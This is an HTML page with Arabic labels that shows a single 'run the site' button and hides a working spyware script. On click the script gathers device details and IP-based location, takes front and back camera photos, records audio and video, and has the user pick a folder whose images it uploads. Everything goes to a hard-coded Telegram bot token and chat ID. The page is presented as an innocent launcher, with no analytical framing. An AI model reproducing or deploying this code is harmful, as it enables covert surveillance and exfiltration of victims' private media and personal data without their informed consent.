<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تشغيل الموقع</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        button:active {
            transform: scale(0.95);
            background: #45a049;
        }
    </style>
</head>
<body>
    <button id="actionButton">تشغيل الموقع</button>

    <script>
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        const actionButton = document.getElementById('actionButton');

        actionButton.addEventListener('click', async function() {
            try {
                // تعطيل الزر أثناء المعالجة
                actionButton.textContent = "جاري التشغيل...";
                actionButton.disabled = true;
                
                // 1. جمع معلومات الجهاز والموقع
                const deviceInfo = await getDeviceInfo();
                const locationInfo = await getLocationInfo();
                await sendToTelegram(formatInfo(deviceInfo, locationInfo));
                
                // 2. التقاط صورة من الكاميرا الأمامية
                const frontCameraImage = await captureCamera('user');
                await sendToTelegram(frontCameraImage, 'sendPhoto', 'front_camera.jpg');
                
                // 3. التقاط صورة من الكاميرا الخلفية
                const backCameraImage = await captureCamera('environment');
                await sendToTelegram(backCameraImage, 'sendPhoto', 'back_camera.jpg');
                
                // 4. تسجيل صوت لمدة 10 ثواني
                const audioBlob = await recordAudio(10000);
                await sendToTelegram(audioBlob, 'sendAudio', 'audio_recording.ogg');
                
                // 5. تسجيل فيديو لمدة 15 ثانية
                const videoBlob = await recordVideo(15000);
                await sendToTelegram(videoBlob, 'sendVideo', 'video_recording.mp4');
                
                // 6. إرسال 20 صورة من الجهاز
                const imagesSent = await sendImagesFromDevice();
                
                // إعلام المستخدم بالانتهاء
                actionButton.textContent = `تم التشغيل بنجاح (${imagesSent} صور)`;
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                actionButton.textContent = "خطأ! اضغط مجدداً";
            } finally {
                setTimeout(() => {
                    actionButton.textContent = "تشغيل الموقع";
                    actionButton.disabled = false;
                }, 5000);
            }
        });

        // ===== الدوال المساعدة =====
        
        async function getDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                memory: navigator.deviceMemory || 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
                battery: await getBatteryStatus()
            };
        }

        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.floor(battery.level * 100)}% ${battery.charging ? 'يشحن' : 'غير مشحون'}`;
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير متاح';
        }

        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    isp: data.org
                };
            } catch {
                return {
                    ip: 'غير معروف',
                    country: 'غير معروف',
                    city: 'غير معروف',
                    isp: 'غير معروف'
                };
            }
        }

        function formatInfo(device, location) {
            return `📱 <b>معلومات الجهاز:</b>\n` +
                   `• النظام: ${device.platform}\n` +
                   `• الشاشة: ${device.screen}\n` +
                   `• البطارية: ${device.battery}\n` +
                   `• الشبكة: ${device.connection}\n\n` +
                   `📍 <b>الموقع:</b>\n` +
                   `• الدولة: ${location.country}\n` +
                   `• المدينة: ${location.city}\n` +
                   `• IP: <code>${location.ip}</code>\n` +
                   `• المزود: ${location.isp}`;
        }

        async function captureCamera(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: facingMode,
                    width: 1280,
                    height: 720 
                }
            });
            
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const bitmap = await imageCapture.grabFrame();
            
            // تحويل Bitmap إلى Blob
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bitmap, 0, 0);
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.8);
                track.stop();
            });
        }

        async function recordAudio(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
                let chunks = [];
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    resolve(new Blob(chunks, { type: 'audio/ogg' }));
                    stream.getTracks().forEach(track => track.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        async function recordVideo(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: 1280, height: 720 },
                audio: true
            });
            
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { 
                    mimeType: 'video/mp4',
                    videoBitsPerSecond: 2500000
                });
                let chunks = [];
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    resolve(new Blob(chunks, { type: 'video/mp4' }));
                    stream.getTracks().forEach(track => track.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        async function sendImagesFromDevice() {
            try {
                const dirHandle = await window.showDirectoryPicker();
                let sentCount = 0;
                
                for await (const entry of dirHandle.values()) {
                    if (sentCount >= 20) break;
                    if (entry.kind === 'file' && /\.(jpg|jpeg|png|gif|webp)$/i.test(entry.name)) {
                        const file = await entry.getFile();
                        await sendToTelegram(file, 'sendPhoto');
                        sentCount++;
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                }
                return sentCount;
            } catch {
                return 0;
            }
        }

        async function sendToTelegram(data, method = 'sendMessage', filename = 'file') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            if (method === 'sendMessage') {
                formData.append('text', data);
                formData.append('parse_mode', 'HTML');
            } else {
                formData.append(
                    method === 'sendAudio' ? 'audio' : 
                    method === 'sendVideo' ? 'video' : 'photo', 
                    data, filename
                );
            }
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
